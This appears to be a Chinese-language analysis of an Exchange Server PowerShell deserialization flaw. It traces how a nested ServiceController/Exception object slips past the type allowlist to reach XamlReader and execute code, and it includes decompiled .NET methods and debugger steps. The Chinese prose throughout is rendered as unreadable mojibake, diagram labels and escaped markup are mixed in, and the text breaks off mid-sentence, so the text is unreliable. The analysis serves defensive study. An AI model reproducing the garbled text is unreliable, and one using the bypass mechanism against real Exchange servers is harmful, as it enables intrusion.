PoCéƒ¨åˆ†ç”±ä¸¤ä¸ªå¯¹è±¡åµŒå¥—è€Œæˆï¼Œå¤§è‡´ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š\nObj V(System.ServiceProcess.ServiceController): String Name=\u0026#34;Type\u0026#34; Obj TargetTypeForDeserialization(System.Exception): ByteArray SerializationData String SerializationData ä»£ç é€»è¾‘\nä»£ç é€»è¾‘å¦‚ä¸‹å›¾\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\r\u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e\rèƒŒæ™¯ 1\rCenter Gradient\ré¡µ-1\ræµç¨‹\rReadOneObject\rReadOneObject\tæµç¨‹.8\rReadOneDeserializedObject éå†XMLæ ‘çš„æ ‡ç­¾\rReadOneDeserializedObjectéå†XMLæ ‘çš„æ ‡ç­¾\tåŠ¨æ€è¿æ¥çº¿\rè°ƒç”¨è¯»å–ä¸€ä¸ªååºåˆ—åŒ–å¯¹è±¡ object obj = this.ReadOneDeserializedObject\rè°ƒç”¨ï¼Œè¯»å–ä¸€ä¸ªååºåˆ—åŒ–å¯¹è±¡object obj = this.ReadOneDeserializedObject\tåŠ¨æ€è¿æ¥çº¿.12\rç¢°åˆ°Objæ ‡ç­¾è°ƒç”¨è¯»å–ä¸€ä¸ªObjå¯¹è±¡ if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){ return thi...\rç¢°åˆ°Objæ ‡ç­¾ï¼Œè°ƒç”¨ï¼Œè¯»å–ä¸€ä¸ªObjå¯¹è±¡if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){return this.ReadPSObject();}\tæµç¨‹.11\rReadPSObject è¯»å–ä¸€ä¸ªObjå¯¹è±¡\rReadPSObjectè¯»å–ä¸€ä¸ªObjå¯¹è±¡\tåŠ¨æ€è¿æ¥çº¿.14\rç¢°åˆ°Propsæ ‡ç­¾è°ƒç”¨è¯»å–Propsæ ‡ç­¾ if (this.IsNextElement(\u0026#34;Props\u0026#34;)){ this.R...\rç¢°åˆ°Propsæ ‡ç­¾ï¼Œè°ƒç”¨ï¼Œè¯»å–Propsæ ‡ç­¾if (this.IsNextElement(\u0026#34;Props\u0026#34;)){this.ReadProperties(psobject);}\tæµç¨‹.13\rReadProperties\rReadProperties\tåŠ¨æ€è¿æ¥çº¿.16\rè°ƒç”¨è¯»å–åµŒå¥—å¯¹è±¡\rè°ƒç”¨ï¼Œè¯»å–åµŒå¥—å¯¹è±¡\tæµç¨‹.15\rReadOneObject\rReadOneObject\tåŠ¨æ€è¿æ¥çº¿.20\rè°ƒç”¨å°†ååºåˆ—åŒ–æ•°æ® è½¬æ¢ä¸ºç›®æ ‡ç±»å‹æ­¤æ—¶ç›®æ ‡ç±»å‹ä¸ºSystem.Exception\rè°ƒç”¨ï¼Œå°†ååºåˆ—åŒ–æ•°æ®è½¬æ¢ä¸ºç›®æ ‡ç±»å‹ï¼Œæ­¤æ—¶ç›®æ ‡ç±»å‹ä¸ºSystem.Exception\tæµç¨‹.19\rConvertTo\rConvertTo\tåŠ¨æ€è¿æ¥çº¿.22\rä¸€ç³»åˆ—è°ƒç”¨\rä¸€ç³»åˆ—è°ƒç”¨\tæµç¨‹.21\rObject.Reader.Deserialize\rObject.Reader.Deserialize\tåŠ¨æ€è¿æ¥çº¿.24\rè°ƒç”¨è§£æå†…å­˜ä¸­çš„åºåˆ—åŒ–æ•°æ®\rè°ƒç”¨ï¼Œè§£æå†…å­˜ä¸­çš„åºåˆ—åŒ–æ•°æ®\tæµç¨‹.23\r__BinaryParser.Run\r__BinaryParser.Run\tåŠ¨æ€è¿æ¥çº¿.28\ræµç¨‹.27\rå°†åºåˆ—åŒ–æ•°æ®è§£æä¸ºSystem.UnitySerializationHolderå¯¹è±¡å¹¶è½½å…¥m_assmblyNameå¯¹åº”çš„...\rå°†åºåˆ—åŒ–æ•°æ®è§£æä¸ºSystem.UnitySerializationHolderå¯¹è±¡ï¼Œå¹¶è½½å…¥m_assmblyNameå¯¹åº”çš„DLL\tåŠ¨æ€è¿æ¥çº¿.39\ræµç¨‹.38\rè½¬åŒ–ä¸ºåœ¨m_assmblyNameå¯¹åº”çš„DLLä¸­çš„m_dataå¯¹åº”ç±»å‹çš„Typeå¯¹è±¡\rè½¬åŒ–ä¸ºåœ¨m_assmblyNameå¯¹åº”çš„DLLä¸­çš„m_dataå¯¹åº”ç±»å‹çš„Typeå¯¹è±¡\tåŠ¨æ€è¿æ¥çº¿.41\rä¸€ç³»åˆ—è¿”å›\rä¸€ç³»åˆ—è¿”å›\tåŠ¨æ€è¿æ¥çº¿.43\ræµç¨‹.42\rå°†ConverToè¿”å›çš„Typeå¯¹è±¡åŠ å…¥.adaptedMembers\rå°†ConverToè¿”å›çš„Typeå¯¹è±¡åŠ å…¥.adaptedMembers\tæµç¨‹.45\rGetTargetTypeForDeserialization\rGetTargetTypeForDeserialization\tæµç¨‹.53\rReadOneDeserializedObject\rReadOneDeserializedObject\tæµç¨‹.54\rReadOneObject\rReadOneObject\tåŠ¨æ€è¿æ¥çº¿.56\råŠ¨æ€è¿æ¥çº¿.57\råŠ¨æ€è¿æ¥çº¿.58\råŠ¨æ€è¿æ¥çº¿.59\rè°ƒç”¨\rè°ƒç”¨\tåŠ¨æ€è¿æ¥çº¿.61\ræµç¨‹.60\rGetPSStandardMember\rGetPSStandardMember\tåŠ¨æ€è¿æ¥çº¿.63\ræµç¨‹.62\rè¯»å–adaptedMembersçš„TargetTypeForDeserializationå¹¶è¿”å›\rè¯»å–adaptedMembersçš„TargetTypeForDeserializationå¹¶è¿”å›\tåŠ¨æ€è¿æ¥çº¿.66\rè°ƒç”¨å°†å¤–å±‚å¯¹è±¡åºåˆ—åŒ–æ•°æ®\rè°ƒç”¨ï¼Œå°†å¤–å±‚å¯¹è±¡åºåˆ—åŒ–æ•°æ®\tæµç¨‹.65\rLanguagePrimitives.ConvertTo\rLanguagePrimitives.ConvertTo\tåŠ¨æ€è¿æ¥çº¿.69\ræµç¨‹.68\rå°†Sæ ‡ç­¾å†…æ•°æ®è½¬æ¢ä¸ºXamlReaderå¯¹è±¡è§¦å‘ä»£ç æ‰§è¡Œ\rå°†Sæ ‡ç­¾å†…æ•°æ®è½¬æ¢ä¸ºXamlReaderå¯¹è±¡ï¼Œè§¦å‘ä»£ç æ‰§è¡Œ\tåœ¨Exchangeä¸­ï¼Œå…è®¸ååºåˆ—åŒ–çš„ç±»ç™½åå•å’Œç±»ååºåˆ—åŒ–ç›¸å…³ä¿¡æ¯å®šä¹‰åœ¨exchange.partial.types.ps1xmlå’Œexchange.types.ps1xmlç­‰æ–‡ä»¶ä¸­ï¼ŒExchangeä¼šè¯»å–è¿™äº›æ–‡ä»¶ï¼Œåœ¨ååºåˆ—åŒ–æ•°æ®æ—¶ï¼Œä¼špayloadé‡Œé¢çš„ç›®æ ‡ç±»å’Œæ–‡ä»¶é‡Œé¢çš„ç™½åå•ç±»åšå¯¹æ¯”ï¼Œåªæœ‰åœ¨ç™½åå•å†…çš„ç±»æ‰å…è®¸ååºåˆ—åŒ–ã€‚\nPoCç”±åµŒå¥—å¯¹è±¡ç»„æˆï¼Œåœ¨ååºåˆ—åŒ–åµŒå¥—å¯¹è±¡æ—¶ï¼Œä¼šå…ˆååºåˆ—åŒ–é‡Œå±‚å¯¹è±¡ï¼Œè€Œåååºåˆ—åŒ–å¤–å±‚å¯¹è±¡ã€‚åœ¨Exchangååºåˆ—åŒ–PoCçš„é‡Œå±‚å¯¹è±¡æ—¶ï¼Œå°†é€šè¿‡ConvertToå‡½æ•°è½¬æ¢åˆ°ç›®æ ‡ç±»ï¼Œä¼ ç»™ConvertToçš„resultTypeå€¼ä¸ºSystem.Exceptionï¼ŒSystem.Exceptionåœ¨exchange.partial.types.ps1xmlä¸­å®šä¹‰å¦‚ä¸‹ï¼š\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.Exception\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;CodeProperty IsHidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;SerializationData\u0026lt;/Name\u0026gt; \u0026lt;GetCodeReference\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;MethodName\u0026gt;GetSerializationData\u0026lt;/MethodName\u0026gt; \u0026lt;/GetCodeReference\u0026gt; \u0026lt;/CodeProperty\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;TypeConverter\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;/TypeConverter\u0026gt; \u0026lt;/Type\u0026gt; internal static object ConvertTo(object valueToConvert, Type resultType, bool recursion, IFormatProvider formatProvider, TypeTable backupTypeTable) { object result; using (LanguagePrimitives.typeConversion.TraceScope(\u0026#34;Converting \\\u0026#34;{0}\\\u0026#34; to \\\u0026#34;{1}\\\u0026#34;.\u0026#34;, valueToConvert, resultType)) { if (resultType == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;resultType\u0026#34;); } bool flag; result = LanguagePrimitives.FigureConversion(valueToConvert, resultType, out flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) : null, formatProvider, backupTypeTable); } return result; } å…¶å®šä¹‰äº†*\u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt;ï¼ŒExchangeå°†é€šè¿‡Microsoft.Exchange.Data.SerializationTypeConverter*ç±»å¯¹é‡Œå±‚åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–ã€‚Microsoft.Exchange.Data.SerializationTypeConverterç»è¿‡ä¸€ç³»åˆ—è°ƒç”¨ï¼Œæœ€ç»ˆç”±System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ã€‚\nåœ¨è¯¥æ–¹æ³•ä¼šè°ƒç”¨System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Runï¼Œè¿™æ–¹æ³•ä¼šå¾ªç¯è¯»å–å†…å­˜ä¸­çš„é‡Œå±‚å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼Œå°†å…¶è½¬æ¢ä¸ºSystem.UnitySerializationHolderå¯¹è±¡ã€‚\nä¹‹åExchangeä¼šé€šè¿‡Assembly.LoadFromè½½å…¥*System.UnitySerializationHolder.m_assemblyNameæ‰€æŒ‡æ˜çš„DLLï¼Œå¹¶ä¸”è¿”å›System.UnitySerializationHolder.m_data*ç±»å‹çš„Typeå¯¹è±¡ã€‚\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ...... serParser.Run(); ...... if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } åœ¨ä¸€ç³»åˆ—å‡½æ•°è°ƒç”¨è¿”å›åï¼ŒSystem.Management.Automation.InternalDeserializer.ReadPropertiesä¼šå°†System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeè¿”å›çš„å¯¹è±¡æ·»åŠ åˆ°PSObject.adaptedMembersä¸­ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥å¯¹è±¡å˜é‡åä¸ºTargetTypeForDeserializationã€‚\nprivate void ReadProperties(PSObject dso) { dso.isDeserialized = true; dso.adaptedMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod\u0026lt;PSMemberInfo\u0026gt;(dso, \u0026#34;GetType\u0026#34;)); PSGetMemberBinder.SetHasInstanceMember(\u0026#34;GetType\u0026#34;); dso.clrMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); if (this.ReadStartElementAndHandleEmpty(\u0026#34;Props\u0026#34;)) { while (this._reader.NodeType == XmlNodeType.Element) { string name = this.ReadNameAttribute(); object serializedValue = this.ReadOneObject(); PSProperty member = new PSProperty(name, serializedValue); dso.adaptedMembers.Add(member); } this.ReadEndElement(); } } åœ¨ååºåˆ—åŒ–å¤–å±‚å¯¹è±¡æ—¶ï¼ŒReadOneObjectä¼šè°ƒç”¨GetTargetTypeForDeserializationè·å–ååºåˆ—åŒ–çš„ç›®æ ‡ç±»å‹ï¼Œå¹¶é€šè¿‡ConvertToè½¬åŒ–ä¸ºè¯¥å¯¹è±¡ã€‚\nåœ¨GetTargetTypeForDeserializationå‡½æ•°ä¸­ï¼Œå°†ä¼šè°ƒç”¨GetPSStandardMemberå¹¶ä¼ å…¥ç¡¬ç¼–ç çš„TargetTypeForDeserializationï¼Œåœ¨GetPSStandardMemberä¸­ä¼šé€šè¿‡TypeTableGetMemberDelegateåˆ›å»ºæˆå‘˜é›†åˆï¼Œå…¶ä¸­åŒ…æ‹¬å­ç±»çš„æˆå‘˜å±æ€§ï¼Œè€ŒååŒ¹é…å…¶ä¸­çš„memberNameé¡¹å¯¹åº”çš„å€¼å¹¶è¿”å›ã€‚æ­¤æ—¶è·å–çš„å€¼ä¸ºXamlReaderç±»å‹çš„Typeå¯¹è±¡ã€‚\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } internal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } å¤–å±‚ç±»ç±»å‹å®šä¹‰ä¸ºSystem.ServiceProcess.ServiceControllerï¼Œå…¶å®šä¹‰åœ¨types.ps1xmlæ–‡ä»¶å†…ï¼Œå®šä¹‰å¦‚ä¸‹ã€‚\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;MemberSet\u0026gt; \u0026lt;Name\u0026gt;PSStandardMembers\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;PropertySet\u0026gt; \u0026lt;Name\u0026gt;DefaultDisplayPropertySet\u0026lt;/Name\u0026gt; \u0026lt;ReferencedProperties\u0026gt; \u0026lt;Name\u0026gt;Status\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;DisplayName\u0026lt;/Name\u0026gt; \u0026lt;/ReferencedProperties\u0026gt; \u0026lt;/PropertySet\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/MemberSet\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServiceName\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;RequiredServices\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServicesDependedOn\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;ScriptMethod\u0026gt; \u0026lt;Name\u0026gt;ToString\u0026lt;/Name\u0026gt; \u0026lt;Script\u0026gt; $this.ServiceName \u0026lt;/Script\u0026gt; \u0026lt;/ScriptMethod\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/Type\u0026gt; åœ¨GetPSStandardMemberå‡½æ•°ä¼šè¯•å›¾è·å–System.ServiceProcess.ServiceControllerç±»çš„TargetTypeForDeserializationï¼ˆä¼ å…¥çš„ç¡¬ç¼–ç å‚æ•°ï¼‰å±æ€§ï¼Œä½†å…¶åœ¨æ–‡ä»¶å†…æ²¡æœ‰å®šä¹‰é»˜è®¤çš„TargetTypeForDeserializationå€¼ï¼Œæ‰€ä»¥å¤–å±‚ç±»çš„memberså†…æ²¡æœ‰TargetTypeForDeserializationåå­—çš„å€¼ï¼ŒExchangeå°†è¯•å›¾ä»å­ç±»çš„memberså±æ€§ä¸­æ£€ç´¢TargetTypeForDeserializationåå­—çš„å€¼ï¼Œå‰é¢è¯´è¿‡åœ¨å¯¹å†…å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œé€šè¿‡ReadPropertieså°†åä¸ºTargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡æ·»åŠ åˆ°äº†adaptedMembersä¸­ï¼Œæ­¤æ—¶Exchangeå°†ä¼šæ£€ç´¢åˆ°è¯¥å¯¹è±¡å¹¶è¿”å›ã€‚\nè·å–åˆ°targetTypeForDeserializationä¹‹åï¼ŒReadOneObjectè°ƒç”¨LanguagePrimitives.ConvertToå°†åºåˆ—åŒ–æ•°æ®è½¬æ¢ä¸ºtargetTypeForDeserialization(XamlReader)ã€‚\ninternal object ReadOneObject(out string streamName) { .... object obj = this.ReadOneDeserializedObject(out streamName, out flag); ..... Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(this._typeTable); .... object obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, true, CultureInfo.InvariantCulture, this._typeTable); ..... } ConvertToå‡½æ•°ä¼šè¿›è¡Œå¦‚ä¸‹è°ƒç”¨é“¾ï¼Œé€šè¿‡åå°„è·å–åˆ°XamlReaderç±»çš„Parseæ–¹æ³•åï¼Œå°†å…¶è°ƒç”¨ï¼ŒæˆåŠŸæ‰§è¡Œä»£ç ã€‚\nè°ƒè¯• ä½¿ç”¨dnsPyé™„åŠ åˆ°ä¸‹é¢çš„è¿›ç¨‹\nc:\\windows\\system32\\inetsrv\\w3wp.exe -ap \u0026#34;MSExchangePowerShellAppPool\u0026#34; -v \u0026#34;v4.0\u0026#34; -c \u0026#34;C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\u0026#34; -a \\\\.\\pipe\\iisipm319caf0c-5de0-4833-8a04-4b28f4a836ae -h \u0026#34;C:\\inetpub\\temp\\apppools\\MSExchangePowerShellAppPool\\MSExchangePowerShellAppPool.config\u0026#34; -w \u0026#34;\u0026#34; -m 0 åœ¨ä»¥ä¸‹å‡ ä¸ªåœ°æ–¹ä¸‹æ–­ç‚¹\nSystem.Runtime.Serialization.Formatters.Binary ObjectReader.Deserialize å‘é€PoCï¼Œè°ƒè¯•å™¨åœ¨æ–­ç‚¹å¤„æ–­ä¸‹ï¼Œæ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹:\næ­¤æ—¶ä¸ºExchangeè¯•å›¾å°†Propsæ ‡ç­¾å†…çš„åºåˆ—åŒ–æ•°æ®é€šè¿‡ConvertToå‡½æ•°è½¬åŒ–ä¸ºSystem.Exceptionå¯¹è±¡ï¼ŒSystem.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeä¼šé€šè¿‡serParser.Run()è§£æè¯»å…¥å†…å­˜ä¸­çš„base64è§£ç æ•°æ®ã€‚\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ..... serParser.Run(); if (this.bFullDeserialization) { this.m_objectManager.DoFixups(); } if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } serParser.Run()ä¼šå°†å†…å­˜åºåˆ—åŒ–æ•°æ®è¯•å›¾è½¬åŒ–ä¸ºSystem.UnitySerializationHolder å¯¹è±¡ï¼Œä»£ç å¦‚ä¸‹ï¼Œé€šè¿‡å¾ªç¯è¯»å–å„ä¸ªæ ‡å¿—ä½è°ƒç”¨ä¸åŒæ–¹æ³•ä»å†…å­˜ä¸­è¯»å–æŒ‡å®šç±»å‹çš„æ•°æ®ã€‚æ„é€ å‡ºSystem.UnitySerializationHolderå¯¹è±¡å¹¶è½½å…¥System.UnitySerializationHolder.AssemblyNameå¯¹åº”çš„DLLã€‚\ninternal void Run() { try { bool flag = true; this.ReadBegin(); this.ReadSerializationHeaderRecord(); while (flag) { BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object; BinaryTypeEnum binaryTypeEnum = this.expectedType; if (binaryTypeEnum != BinaryTypeEnum.Primitive) { if (binaryTypeEnum - BinaryTypeEnum.String \u0026gt; 6) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TypeExpected\u0026#34;)); } byte b = this.dataReader.ReadByte(); binaryHeaderEnum = (BinaryHeaderEnum)b; switch (binaryHeaderEnum) { case BinaryHeaderEnum.Object: this.ReadObject(); break; case BinaryHeaderEnum.ObjectWithMap: ..... this.ReadObjectWithMap(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectWithMapTyped: ...... this.ReadObjectWithMapTyped(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectString: ...... this.ReadObjectString(binaryHeaderEnum); break; case BinaryHea......flag2) { ObjectProgress objectProgress = (ObjectProgress)this.stack.Peek(); if (objectProgress == null) { this.expectedType = BinaryTypeEnum.ObjectUrt; this.expectedTypeInformation = null; flag2 = true; } else { flag2 = objectProgress.GetNext(out objectProgress.expectedType, out objectProgress.expectedTypeInformation); this.expectedType = objectProgress.expectedType; this.expectedTypeInformation = objectProgress.expectedTypeInformation; if (!flag2) { this.prs.Init(); if (objectProgress.memberValueEnum == InternalMemberValueE.Nested) { this.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } else { this.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } this.stack.Pop(); this.PutOp(objectProgress); } } } } } } ...... } å°†XamlReaderè¯»å…¥å†…å­˜\nåœ¨System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeä¸­å°†é€šè¿‡\nthis.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); å°†System.UnitySerializationHolderè½¬åŒ–ä¸ºTypeç±»å‹çš„XamlReaderå¯¹è±¡ï¼Œå¹¶é€šè¿‡åå°„è·å–äº†XamlReaderç±»çš„å„ä¸ªå±æ€§ã€‚\nåœ¨æœ€åå°†this.TopObjectä½œä¸ºè¿”å›å€¼è¿”å›ï¼Œåœ¨ç»è¿‡ä¸€ç³»åˆ—å‡½æ•°è°ƒç”¨è¿”å›åï¼Œå¯ä»¥åœ¨è°ƒè¯•å™¨çœ‹åˆ°ConvertToå‡½æ•°è¿”å›äº†Objectç±»å‹å¯¹è±¡obj2ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸ºç±»å‹ä¸ºTypeç±»å‹çš„XamlReaderå¯¹è±¡ï¼Œä¹‹åReadOneObjectè¿”å›è¯¥å¯¹è±¡ã€‚\næ³¨ï¼šTypeç±»å‹æ˜¯Exchangeå†…å®šä¹‰çš„æŠ½è±¡ç±»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\nnamespace System { // Token: 0x02000148 RID: 328 [ClassInterface(ClassInterfaceType.None)] [ComDefaultInterface(typeof(_Type))] [ComVisible(true)] [__DynamicallyInvokable] [Serializable] public abstract class Type : MemberInfo, _Type, IReflect { // Token: 0x17000217 RID: 535 // (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A public override MemberTypes MemberType { get { return MemberTypes.TypeInfo; } } (åº”è¯¥å¯ä»¥ç†è§£obj2ä¸ºå®ç°äº†Typeè¿™ä¸ªæŠ½è±¡ç±»çš„XamlReaderå¯¹è±¡ï¼Œè€ŒXamlReaderç»§æ‰¿äº†Objectè¿™ä¸ªçˆ¶ç±»ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨Objectç±»å‹å¯¹è±¡æ¥å—)\nåœ¨è°ƒç”¨æ ˆå†…ï¼ŒReadOneObjectç”±ReadPropertiesè°ƒç”¨ï¼Œå›åˆ°ReadPropertiesé€»è¾‘ä¸­ï¼ŒExchangeä¼šå°†ReadOneObjectè¿”å›çš„çš„Typeç±»å‹çš„XamlReaderå¯¹è±¡æ·»åŠ åˆ°dso.adaptedMembersä¸­ï¼Œè€Œåè¿™ä¸ªdsoå°†ä¼šè¿”å›åˆ°è°ƒç”¨æ ˆå†…çš„ReadOneObjectå‡½æ•°ã€‚\nç»§ç»­è°ƒè¯•ï¼Œæ­¤æ—¶åµŒå¥—å¯¹è±¡çš„å†…å±‚å¯¹è±¡å·²ååºåˆ—åŒ–ï¼Œå¼€å§‹ååºåˆ—åŒ–å¤–å±‚å¯¹è±¡ï¼Œå›åˆ°ç¨‹åºä¸­ï¼Œä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œå°†ä¼šè°ƒç”¨psobject.GetTargetTypeForDeserializationè·å–ç›®æ ‡ååºåˆ—åŒ–ç±»å‹ï¼Œæ­¤æ—¶psobjectå†…çš„adaptedMemberså†…æœ‰åä¸ºTargetTypeForDeserializationçš„å¯¹è±¡ï¼Œå…¶ç±»å‹ä¸ºTypeçš„XamlReaderå¯¹è±¡\nè¿›å…¥åˆ°psobject.GetTargetTypeForDeserializationå†…ï¼Œè°ƒç”¨this.GetPSStandardMemberè¯•å›¾è·å–PSMemberInfo å¯¹è±¡ï¼Œè€Œåå°†å…¶å¼ºè½¬ä¸ºTypeå¯¹è±¡è¿”å›ï¼Œè‹¥å¤±è´¥åˆ™è¿”å›null\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } åœ¨GetPSStandardMemberå‡½æ•°å†…ï¼Œè°ƒç”¨PSObject.TypeTableGetMemberDelegateå¹¶ä¼ å…¥å½“å‰å¯¹è±¡ã€å…è®¸çš„ç±»å‹åˆ—è¡¨å’Œç¡¬ç¼–ç PSStandardMembersä»¥åˆå§‹åŒ–PSMemberSet å¯¹è±¡ã€‚\ninternal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } è€Œåè°ƒç”¨PSMemberInfoIntegratingCollectionæ„é€ 